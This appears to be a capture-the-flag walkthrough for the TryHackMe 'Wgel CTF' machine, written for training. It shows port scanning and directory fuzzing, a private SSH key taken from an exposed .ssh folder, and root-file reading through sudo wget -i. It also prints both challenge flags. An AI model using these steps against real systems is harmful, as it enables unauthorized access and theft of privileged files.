# Wgel_CTF
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* SSH
* Search Username
* Sudoers

Tools used
--
* nmap
* ffuf
* ssh
* wget

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.175.239
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
sudo nmap -sS -sC -sV 10.10.175.239 -p- -T5 -vvv -g 53

<SNIP>
Discovered open port 22/tcp on 10.10.175.239
Discovered open port 80/tcp on 10.10.175.239
<SNIP>
```
Let's fuzz the HTTP service:
```
ffuf -u http://10.10.175.239/FFUF -H 'Host: 10.10.175.239' -H 'User-Agent: Mozi
lla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xh
tml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-En
coding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'S
ec-GPC: 1' -w $SECLISTS/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

sitemap                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 111ms]
```
If we visit `http://10.10.175.239/sitemap/`, we land on a website. Let's explore it. By visiting the several pages linked inside the website, we don't find anything useful. Let's fuzz this level of the website:
```
ffuf -u http://10.10.175.239/sitemap/FFUF -H 'Host: 10.10.175.239' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64;
 rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept
-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' 
-H 'Sec-GPC: 1' -w $SECLISTS/Discovery/Web-Content/common.txt:FFUF

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 43ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 44ms]
.ssh                    [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 44ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 45ms]
css                     [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 46ms]
fonts                   [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 41ms]
images                  [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 38ms]
index.html              [Status: 200, Size: 3940, Words: 17, Lines: 13, Duration: 39ms]
js                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 37ms]
```
## Phase 2: Foothold

By accessing on `.ssh` we can retrieve the `id_rsa`. Now we need to find a username. The username can be found in the Apache source page at `http://10.10.175.239/` as `jessie`. Run:
```
ssh -i id_rsa 10.10.175.239 -l jessie

cat Documents/user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
```

## Phase 3: Privilege Escalation

Run:
```
sudo -l

Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
Let's read the root flag file:
```
sudo wget -i /root/root_flag.txt

--2022-09-17 03:32:42--  http://b1b968b37519ad1daa6408188649263d/
Resolving b1b968b37519ad1daa6408188649263d (b1b968b37519ad1daa6408188649263d)... failed: Name or service not known.
wget: unable to resolve host address ‘b1b968b37519ad1daa6408188649263d’
```
So we got the root flag.